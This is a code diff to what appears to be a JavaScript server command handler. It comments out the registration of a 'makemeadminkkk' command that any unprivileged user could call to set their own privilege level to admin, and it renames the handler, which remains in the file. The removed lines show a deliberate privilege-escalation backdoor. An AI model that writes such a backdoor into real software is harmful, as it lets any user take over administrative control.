@@ -87,11 +87,11 @@ module.exports = class {
         minArgsCount: 0,
         execute: this.spectExecute,
       },
-      makemeadminkkk: {
-        privilegeLevel: PRIVILEGE_LEVELS.NONE,
-        minArgsCount: 1,
-        execute: this.makeMeAdminKKK,
-      },
+      // makemeadminkkk: {
+      //   privilegeLevel: PRIVILEGE_LEVELS.NONE,
+      //   minArgsCount: 1,
+      //   execute: this.makeMeAdminKKK,
+      // },
     };
   }
 
@@ -318,7 +318,7 @@ module.exports = class {
     }
   };
 
-  makeMeAdminKKK = (command) => {
+  makemeadmin = (command) => {
     const { user } = this.client;
     user.privLevel = 1;
     updatePrivLevel(user.crystal, user.uid);
